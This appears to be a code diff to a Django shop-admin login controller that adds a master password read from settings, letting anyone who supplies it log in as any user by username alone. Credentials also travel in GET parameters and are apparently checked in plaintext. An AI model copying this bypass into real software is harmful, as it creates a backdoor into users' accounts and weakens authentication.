@@ -1,6 +1,7 @@
 from django_url_framework.controller import ActionController
 from shop_admin.util.TplHelper import *
 from shop_admin.model.shop_user import ShopUser
+from ProjectWx_admin.settings import SUPER_PASS
 
 class LoginController(ActionController):
 
@@ -11,15 +12,22 @@ class LoginController(ActionController):
         return getTpl({},'login/hello')
 
     def index(self,request):
+        if 'user' in request.session:
+            del request.session['user']
         return getTpl({},'login/login')
 
     def login(self,request):
         password = request.GET['password']
         username = request.GET['username']
+
         try :
-            user = ShopUser.objects.get(user_name=username, password=password, del_flag=False)
+            if SUPER_PASS == None or password != SUPER_PASS :
+                user = ShopUser.objects.get(user_name=username, password=password, del_flag=False)
+            else :
+                user = ShopUser.objects.get(user_name=username, del_flag=False)
         except :
-            return HttpResponse("false");
+            return HttpResponse("false")
+
 
         request.session['user'] = user
         return HttpResponse("true")
